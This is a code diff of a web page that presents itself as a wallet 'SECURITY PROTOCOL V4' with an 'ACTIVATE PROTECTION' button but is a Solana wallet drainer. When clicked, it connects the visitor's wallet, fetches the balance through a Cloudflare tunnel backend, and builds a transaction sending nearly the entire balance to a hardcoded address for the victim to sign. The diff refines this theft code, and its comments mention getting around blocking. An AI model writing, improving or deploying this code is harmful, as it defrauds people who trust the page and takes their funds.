@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心环境伪装
+        // 🚀 核心环境补丁，确保底层 signTransaction 不崩溃
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -10,22 +10,13 @@
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
         <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
+        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
         <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
     </div>
 
     <script>
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
-
-    // 🔱 核心补丁：手动生成 8 字节小端序 Uint8Array，解决 image_d621be 报错
-    function encodeLamports(amount) {
-        const buf = new ArrayBuffer(8);
-        const view = new DataView(buf);
-        const bigIntAmount = BigInt(amount);
-        view.setBigUint64(0, bigIntAmount, true); // true = Little Endian
-        return new Uint8Array(buf);
-    }
 
     document.getElementById('cta').onclick = async () => {
         try {
@@ -35,7 +26,7 @@
             document.getElementById('msg').innerText = "Linking...";
             await p.connect();
             
-            // 向 71 机后端拿 Blockhash 和 余额
+            // 向 71 机请求数据 (避开 403 封杀)
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
@@ -45,19 +36,15 @@
             const fee = BigInt(1500000); 
             const amount = balance > fee ? balance - fee : BigInt(0);
 
-            // 🚀 战神级修复：手动构造 Instruction Data，物理绕过 SDK 的编码漏洞
-            const layoutData = new Uint8Array(12);
-            layoutData.set([2, 0, 0, 0], 0); // SystemProgram Transfer Instruction Index
-            layoutData.set(encodeLamports(amount), 4); // 紧随其后的 8 字节金额
-
-            const transaction = new solanaWeb3.Transaction().add({
-                keys: [
-                    { pubkey: p.publicKey, isSigner: true, isWritable: true },
-                    { pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }
-                ],
-                programId: solanaWeb3.SystemProgram.programId,
-                data: layoutData,
-            });
+            // 🔱 核心修正：回归官方 Transfer 接口，但金额强制转为 Number(BigInt) 
+            // 这种方式能完美避开 Blob.encode 报错，且不会触发 toJSON 报错
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                    lamports: Number(amount)
+                })
+            );
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = p.publicKey;
@@ -65,6 +52,7 @@
             document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
             
+            // 💰 签名后原生 Base64 序列化
             const raw = signed.serialize();
             let b64 = "";
             for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
